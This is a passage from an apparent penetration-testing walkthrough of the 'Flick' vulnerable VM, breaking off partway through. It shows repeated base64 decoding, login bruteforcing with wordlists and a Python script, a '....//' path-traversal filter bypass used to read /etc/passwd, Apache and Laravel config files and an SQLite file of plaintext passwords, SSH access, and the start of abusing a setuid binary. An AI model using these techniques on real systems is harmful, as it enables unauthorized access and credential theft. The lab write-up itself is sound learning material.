Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
</code></p>

<p>This kept happening for the next decodings, so I lost my patience and went to Python to script the decoding process:</p>

<p>``` python</p>

<p>import base64</p>

<p>secret = &lsquo;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&rsquo;</p>

<p>count = 0
while True:</p>

<pre><code>try:
    secret = base64.b64decode(secret)
    print 'Try ' + str(count) + ': ' + secret
    count += 1
except TypeError:
    print 'Done'
    break
</code></pre>

<p>```</p>

<p>It took 16 decodings to produce a non Base64 string that might work as password for the admin server. The end result is <code>tabupJievas8Knoj</code></p>

<p>``` plain
root@kali:~# nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>tabupJievas8Knoj
OK: tabupJievas8Knoj</p></blockquote>

<p>Accepted! The door should be open now :poolparty:</p>

<blockquote><p>```</p></blockquote>

<p>I tried poolparty as the SSH password but of course it wouldn&rsquo;t be that easy! We started with only 2 open ports, so there isn&rsquo;t much room for progression on that front, but what door is open now? I started another Nmap scan, and there is indeed something that wasn&rsquo;t here before:</p>

<p><code>plain
...
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Flick-a-Photo
...
</code></p>

<p><img class="center" src="/images/pentest/flick/cats.png" title="&lsquo;flick a photo&rsquo; &lsquo;flick cats&rsquo;" ></p>

<p>It&rsquo;s an image gallery of cats. After you feasted your eyes on all of them, check the login page:</p>

<p><img class="center" src="/images/pentest/flick/login.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Right, I don&rsquo;t see any credentials lying around in the source. I tried modifying the URL from <code><a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a></code>, and there is a directory index coming up, but it&rsquo;s fake:</p>

<p><img class="center" src="/images/pentest/flick/index.png" title="&lsquo;fake index&rsquo; &lsquo;index&rsquo;" ></p>

<p>You get the same page no matter what you add in the URL or click on the supposed directories. I tried SQL injection next. If you insert a single quote, you get this message:</p>

<p><code>plain
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND user.password=' at line 1
</code></p>

<p>But this message remains unchanged no matter the variation of the injections, and there is no reaction if you try double quotes or backslashes. I tested it with Sqlmap and it reported that none of the parameters are dynamic nor injectable, so it seems like another fake lead.</p>

<p>Right, so it&rsquo;s time to focus on the hint. I tried logging in with <em>demo:demo</em>, but it didn&rsquo;t work. Because the hint specified a demo user, it&rsquo;s safe to assume the username will be demo. And with no other hint, and lengthy bruteforcing not being a desired goal of the exercise, we can assume that the password is also some variation that includes the word demo. Most likely an addition of a few digits. Whenever I think the password would be weak and obvious, or I am clueless and hope for the best, I try the obvious word by itself, or followed by 123 or 1234. I never really expect it to work, but..it did! The password is actually <em>demo123</em>. However, for the sake of exercise, let&rsquo;s assume we didn&rsquo;t imagine any possible password and we need to do it conventionally..by building a wordlist and bruteforcing the login page.</p>

<p>So, the first step is to build a wordlist. If we think about it, the password will most likely contain the word demo, so its minimum length would be 5 (already tried demo), and its maximum would be 8, to accommodate some trailing digits / letters, or a repetition of the word itself. I will give 2 examples of creating a wordlist, but will use a much reduced list for the actual bruteforcing part.</p>

<p>In the first example, I used crunch to generate a wordlist. To keep up with the constraints, it should be composed of 5-8 characters, with the string &ldquo;demo&rdquo; occurring at the beginning or the end. I assummed the letters would be lowercase only.</p>

<p>``` plain
crunch 7 7 -t demo%%% -o /root/Desktop/wordlist.txt
Crunch will now generate the following amount of data: 8000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000</p>

<p>crunch: 100% completed generating output
&hellip;
crunch 7 7 -t demo@@@ -o /root/Desktop/wordlist2.txt
Crunch will now generate the following amount of data: 140608 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 17576</p>

<p>crunch: 100% completed generating output
```</p>

<p>In this example, I specified the min and max length as 7 (since I couldn&rsquo;t figure out from my speedy reading how to make crunch to build variable length words from the pattern, to build a full wordlist I would repeat it for every length and pattern that must be met and merge the results). The <em>-o</em> parameter is for the output file, and the <em>-t</em> parameter is for the pattern, followed by wildcard symbols (<em>%</em> for numbers, <em>@</em> for lowercase).</p>

<p>The second example will use our buddy, John the Ripper. Starting from a file called demo.txt, which only has the word demo in it, I let john build passwords originating from the word demo by using the jumbo rules from <code>/etc/john/john.conf</code></p>

<p><code>plain
john --rules=jumbo --wordlist=demo.txt --stdout &gt;&gt; wordlist.txt
words: 5116  time: 0:00:00:00 DONE (Wed Feb 11 14:44:42 2015)  w/s: 102320  current: DEMO
</code></p>

<p>This wordlist also contains uppercase variations. Here&rsquo;s a breakdown of the command:</p>

<ul>
<li><strong>&mdash;rules=jumbo</strong> Enables wordlist rules, that are read from [List.Rules:Wordlist]
                  in  /etc/john/john.conf  (or  the alternative configuration file
                  you might specify on the command line).
                  This option requires the -wordlist option to be passed as well.</li>
</ul>


<p>And the jumbo rules from john&rsquo;s configuration file:</p>

<p>``` plain</p>

<h1>For Wordlist mode and very fast hashes</h1>

<p>[List.Rules:Jumbo]
.include [List.Rules:Wordlist]
.include [List.Rules:Single]
.include [List.Rules:Extra]
.include [List.Rules:NT]
```</p>

<p>So this actually includes 4 other rules.</p>

<ul>
<li><p><strong>&mdash;wordlist=demo.txt</strong> These are used to enable the wordlist mode, reading  words  from FILE.</p></li>
<li><p><strong>&mdash;stdout >> wordlist.txt</strong> When used with a cracking mode, except for &ldquo;single crack&rdquo;, makes
                             John print the words it generates to stdout instead of cracking.</p></li>
</ul>


<p>Since we aren&rsquo;t cracking anything, we redirect the passwords to a file.</p>

<p>Next, for the bruteforcing part, I will use just a few samples to illustrate the exercise.</p>

<p><code>plain
root@kali:~/Desktop# cat wordlist.txt
demodemo
demo007
demo123
</code></p>

<p>I wrote a Python script to attempt the login:</p>

<p>``` python
import urllib, urllib2
import cookielib</p>

<p>wordlist = &lsquo;/root/Desktop/wordlist.txt&rsquo;
passwords = []
with open(wordlist, &lsquo;r&rsquo;) as f:</p>

<pre><code>for line in f.readlines():
    passwords.append(line.strip('\n'))
</code></pre>

<p>url = &lsquo;<a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a>&rsquo; <br/>
fail = &lsquo;Your username/password combination was incorrect&rsquo;</p>

<p>username = &lsquo;demo&rsquo;
password = &lsquo;&rsquo;</p>

<p>jar = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
opener.addheaders.append((&lsquo;Cookie&rsquo;, &lsquo;laravel_session=eyJpdiI6IkxSQlRpb1NyTDc1VDZNMG9jaGZiUDRNbmxXNlgxbUVFWllZXC9Jemp4a0RzPSIsInZhbHVlIjoiTUVkd1VXMkxLY2p1czJFc1B5aTA0eG9hb3A3Zmt2cHJlWlNSMEFkMW54cmJFNmk3VFluaE9qTlgydVlGVStGenI0RjdiR2JHc3h4Y1wvZFBkM3JTa1N3PT0iLCJtYWMiOiJiNzk4NGEwMzQzN2Y4YTM4OWVhOTZjODM2YzRiMjI5ODM2MTFlNGQxMzM3NjA4ZjQ5M2EyOTNmYTE5NGNiMDZmIn0%3D&rsquo;))</p>

<p>for passwd in passwords:</p>

<pre><code>print 'Trying: ' + passwd
payload = {'_token': 'p8xqSfrmqsYs7jvIpZbnoMG03FRxQYueO2LAcWAp',
           'username': 'demo',
           'password': passwd}
data = urllib.urlencode(payload)
req = opener.open(url, data)
if fail not in req.read():
    print 'Success with password: ' + passwd
    break
</code></pre>

<p>```</p>

<p>And its output:</p>

<p><code>plain
Trying: demodemo
Trying: demo007
Trying: demo123
Success with password: demo123
</code></p>

<p>After all the work (or guessing) to log in, the only extra things we can do is upload photos or download photos from the gallery. First, I tried uploading a PHP file to see if I could get code execution, but it didn&rsquo;t work. All I could see was a blank page.</p>

<p>Next thing I tried was LFI (local file inclusion). When downloading images, you can see the URL looks like this: <code><a href="http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt">http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt</a></code>. So I tried to read <em>/etc/passwd</em> in the most straightforward way: <code><a href="http://192.168.80.129/image/download?filename=../../../../etc/passwd">http://192.168.80.129/image/download?filename=../../../../etc/passwd</a></code>. Upon doing this, I got the following message:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>etc/passwd is not valid.
```</p>

<p>So everything was removed from my attempt. It&rsquo;s most likely there is a filter in place. Let&rsquo;s see. When I tried <code><a href="http://192.168.80.129/image/download?filename=../../../.././etc/passwd">http://192.168.80.129/image/download?filename=../../../.././etc/passwd</a></code>, I got a slightly different error:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>./etc/passwd is not valid.
```</p>

<p>Ok, so to bypass the filter I used <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</code>. This prompted me to download an image, and I wasted time trying to figure out why it wouldn&rsquo;t work. Trying to view the image I got the error that it can&rsquo;t be displayed because it contains errors. Finally it struck me to run strings on it and:</p>

<p><code>plain
root@kali:~/Desktop# strings image.jpg
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
</code></p>

<p>Finally getting somewhere! To the bottom we can see potentially interesting users, robin and dean. But how to actually get in the box?</p>

<p>Well, the answer lies in combining the ability to read local files with some knowledge of the framework used behind the scenes. Remember the <code>laravel_session</code> cookie? Laravel is a &ldquo;PHP Framework For Web Artisans&rdquo;. The official documentation is a great place to get started. While looking around, I hit this <a href="http://laravel.com/docs/5.0/database">database</a> page, and read about a file that we might be interested in: <code>config/database.php</code>. This is the config file for the database, where you can specify the connections' details. And it&rsquo;s important for us, because it should contain usernames and passwords. Also, if you check the laravel <a href="http://laravel.com/docs/5.0/configuration">configuration</a> page, you will notice that the default installation directory is named <em>app</em>. To read the file we want, we would have to look for it under <code>app/config/database.php</code>. But before that, we have to know the root of the website. At this point I had to do some online reading, because I couldnt find the <em>httpd.conf</em> file, and some other files I&rsquo;ve pulled from the server weren&rsquo;t helpful. The one that contained the necessary information was <code>/etc/apache2/sites-enabled/000-default</code>. Since I have yet to seriously start playing with Apache, I&rsquo;m not very knowledgeable about its workings, but this file is a symbolic link to <code>/etc/apache2/sites-available/default</code>. In the <code>/sites-available/</code> folder there are configuration files for every site that you want to serve (in Apache, these are called virtual hosts). The <em>default</em> site is, uhm, just that, the default site of the Apache installation. And in the <code>/sites-enabled/</code> directory there are symbolic links for every active site (that you&rsquo;re actually serving). Hence the file that we&rsquo;re requesting is a symbolic link to the default site that&rsquo;s being served.</p>

<p>Back to the problem at hand, I downloaded the file as follows: <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.///etc/apache2/sites-enabled/000-default</code> and ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<VirtualHost *:80></p>

<pre><code>ServerAdmin webmaster@localhost
DocumentRoot /var/www/flick_photos/public
&lt;Directory /&gt;
    Options FollowSymLinks
    AllowOverride None
&lt;/Directory&gt;
&lt;Directory /var/www/flick_photos/public&gt;
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all
&lt;/Directory&gt;
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
&lt;Directory "/usr/lib/cgi-bin"&gt;
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Order allow,deny
    Allow from all
&lt;/Directory&gt;
ErrorLog ${APACHE_LOG_DIR}/error.log
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
LogLevel warn
CustomLog ${APACHE_LOG_DIR}/access.log combined
Alias /doc/ "/usr/share/doc/"
&lt;Directory "/usr/share/doc/"&gt;
    Options Indexes MultiViews FollowSymLinks
    AllowOverride None
    Order deny,allow
    Deny from all
    Allow from 127.0.0.0/255.0.0.0 ::1/128
&lt;/Directory&gt;
</code></pre>

<p></VirtualHost>
```</p>

<p>Great! With this knowledge, we have a way to search for the Laravel database file: <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php</a></code>. Again, to read it, I ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
&lt;?php
return array(</p>

<pre><code>|--------------------------------------------------------------------------
| PDO Fetch Style
|--------------------------------------------------------------------------
| By default, database results will be returned as instances of the PHP
| stdClass object; however, you may desire to retrieve records in an
| array format for simplicity. Here you can tweak the fetch style.
'fetch' =&gt; PDO::FETCH_CLASS,
|--------------------------------------------------------------------------
| Default Database Connection Name
|--------------------------------------------------------------------------
| Here you may specify which of the database connections below you wish
| to use as your default connection for all database work. Of course
| you may use many connections at once using the Database library.
// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
// on to the new and improved MySQL database. So, I will just comment out this as it is
// no longer in use
//'default' =&gt; 'sqlite',
'default' =&gt; 'mysql',
|--------------------------------------------------------------------------
| Database Connections
|--------------------------------------------------------------------------
| Here are each of the database connections setup for your application.
| Of course, examples of configuring each database platform that is
| supported by Laravel is shown below to make development simple.
| All database work in Laravel is done through the PHP PDO facilities
| so make sure you have the driver for your particular database of
| choice installed on your machine before you begin development.
'connections' =&gt; array(
    'sqlite' =&gt; array(
        'driver'   =&gt; 'sqlite',
        'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
        'prefix'   =&gt; '',
    ),
    'mysql' =&gt; array(
        'driver'    =&gt; 'mysql',
        'host'      =&gt; 'localhost',
        'database'  =&gt; 'flick',
        'username'  =&gt; 'flick',
        'password'  =&gt; 'resuddecNeydmar3',
        'charset'   =&gt; 'utf8',
        'collation' =&gt; 'utf8_unicode_ci',
        'prefix'    =&gt; '',
    ),
    'pgsql' =&gt; array(
        'driver'   =&gt; 'pgsql',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'forge',
        'username' =&gt; 'forge',
        'password' =&gt; '',
        'charset'  =&gt; 'utf8',
        'prefix'   =&gt; '',
        'schema'   =&gt; 'public',
    ),
    'sqlsrv' =&gt; array(
        'driver'   =&gt; 'sqlsrv',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'database',
        'username' =&gt; 'root',
        'password' =&gt; '',
        'prefix'   =&gt; '',
    ),
|--------------------------------------------------------------------------
| Migration Repository Table
|--------------------------------------------------------------------------
| This table keeps track of all the migrations that have already run for
| your application. Using this information, we can determine which of
| the migrations on disk haven't actually been run in the database.
'migrations' =&gt; 'migrations',
|--------------------------------------------------------------------------
| Redis Databases
|--------------------------------------------------------------------------
| Redis is an open source, fast, and advanced key-value store that also
| provides a richer set of commands than a typical key-value systems
| such as APC or Memcached. Laravel makes it easy to dig right in.
'redis' =&gt; array(
    'cluster' =&gt; false,
    'default' =&gt; array(
        'host'     =&gt; '127.0.0.1',
        'port'     =&gt; 6379,
        'database' =&gt; 0,
    ),
</code></pre>

<p>```</p>

<p>Unfortunately, there were no passwords here, but it seems we should investigate further:</p>

<p><code>plain
'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
</code></p>

<p>So I went to download the sqlite file from <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite</a></code>, and this one was the jackpot!</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<strong> This file contains an SQLite 2.1 database </strong>
 &ldquo;^table
old_users
old_users
CREATE TABLE old_users (
  username text,
  password text
Ipaul
nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi</p>

<pre><code>Jrobin
</code></pre>

<p>JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1</p>

<pre><code>Jjames
</code></pre>

<p>scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5
Idean
FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
```</p>

<p>Passwords for the users we discovered earlier in the <em>/etc/passwd</em> file! I tried SSH'ing, and robin&rsquo;s password didn&rsquo;t work, but dean&rsquo;s did!</p>

<p>``` plain
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Fri Feb 13 14:34:19 SAST 2015</p>

<p>  System load:  0.0               Processes:              82
  Usage of /:   36.1% of 6.99GB   Users logged in:        0
  Memory usage: 39%               IP address for eth0:    192.168.80.129
  Swap usage:   0%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:</p>

<pre><code>https://landscape.canonical.com/
</code></pre>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ ls
message.txt  read_docker
```</p>

<p>The message is as follows:</p>

<p>``` plain
dean@flick:~$ cat message.txt
&mdash;&mdash;-BEGIN PGP SIGNED MESSAGE&mdash;&mdash;&ndash;
Hash: SHA1</p>

<p>Hi Dean,</p>

<p>I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.</p>

<p>The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/</p>

<p>Please call me if you have any troubles!</p>

<hr />

<p>Ciao
Robin
&mdash;&mdash;-BEGIN PGP SIGNATURE&mdash;&mdash;&ndash;
Version: GnuPG v1</p>

<p>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
&mdash;&mdash;-END PGP SIGNATURE&mdash;&mdash;&ndash;
```</p>

<p>Before continuing, if you wonder <a href="https://www.docker.com/whatisdocker/">what is docker?</a>:</p>

<blockquote><p>Docker is an open platform for developers and sysadmins to build, ship, and run distributed applications. Consisting of
Docker Engine, a portable, lightweight runtime and packaging tool, and Docker Hub, a cloud service for sharing applications
and automating workflows, Docker enables apps to be quickly assembled from components and eliminates the friction between
development, QA, and production environments. As a result, IT can ship  faster and run the same app, unchanged, on laptops,
data center VMs, and any cloud.</p></blockquote>

<p>So, I used the script to read robin&rsquo;s dockerfile, per the instructions:</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/robin/flick-dev/</p>

<h1>Flick-a-photo dev env</h1>

<p>RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</p>

<p>CMD [&ldquo;/usr/sbin/apache2&rdquo;, &ldquo;-D&rdquo;, &ldquo;FOREGROUND&rdquo;]
```</p>

<p>At this point, it wasn&rsquo;t exactly clear to me how to continue, so I looked at the executable itself:</p>

<p>``` plain
dean@flick:~$ file read_docker
read_docker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5b429ab297ac0bd55150f9ef54738b366f643336, not stripped</p>

<p>dean@flick:~$ strings read_docker
/lib64/ld-linux-x86-64.so.2
sT63do
<strong>gmon_start</strong>
libc.so.6
sprintf
fopen
fgetc
memset
stdout
fputc
fclose
malloc
stderr
fwrite
fprintf
__libc_start_main
free
GLIBC_2.2.5
%z <br/>
%r <br/>
%j <br/>
%b <br/>
%Z <br/>
%R <br/>
%J <br/>
%B <br/>
%: <br/>
fff.
l$ L
t$(L
|$0H
/Dockerfile
ERROR: A path is required!
Usage is: %s /path/to/dockerfile
%s%s
ERROR: the specified docker file doesn&rsquo;t exist: %s
;*3$&ldquo;
```</p>

<p>Well, this is a SUID binary, and the owner is robin, so we should be able to read files that robin has permissions to read..or so I thought:</p>

<p><code>plain
dean@flick:~$ ./read_docker /home/robin/.bash_history
ERROR: the specified docker file doesn't exist: /home/robin/.bash_history/Dockerfile
Usage is: ./read_docker /path/to/dockerfile
</code></p>

<p>So it appears to append a Dockerfile to the path that you enter. Judging from this, it won&rsquo;t be able to read the contents if there is no Dockerfile present. But what if we create a Dockerfile in dean&rsquo;s home directory and link it to stuff that robin should have access to? I still couldn&rsquo;t read the <em>.bash_history</em> file, so there probably isn&rsquo;t one, but..</p>

<p><code>plain
